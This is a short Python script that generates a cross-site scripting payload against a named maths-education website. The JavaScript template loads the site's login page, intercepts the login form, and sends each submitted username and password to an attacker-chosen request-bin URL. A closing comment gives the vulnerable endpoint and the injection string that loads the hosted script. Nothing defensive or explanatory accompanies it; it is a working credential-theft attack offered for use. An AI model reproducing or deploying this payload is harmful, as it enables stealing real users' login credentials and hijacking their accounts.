template = '''(async()=>document.write(await fetch('/login.php').then(e=>e.text())+`<script>a=setTimeout,a(()=>$("form[action*=login]").submit(e=>{e.preventDefault(),c=e.currentTarget,(new Image).src="%s"+c[0].value+"||"+c[1].value,a(()=>window.location="/do-question.php?aaid=%d",1e3)}),4e3)</script>`))()'''

bin = input('request bin url: ')
aaid = int(input('question id: '))
code = template % (bin, aaid)

origin = input('origin for JavaScript: ')
print(f'upload the following code to {origin}\n')
print(f'{code}\n')

# vulnerable endpoint: https://drfrostmaths.com/worksheets.php?wdid=-3;</script><script src=[origin]><!--
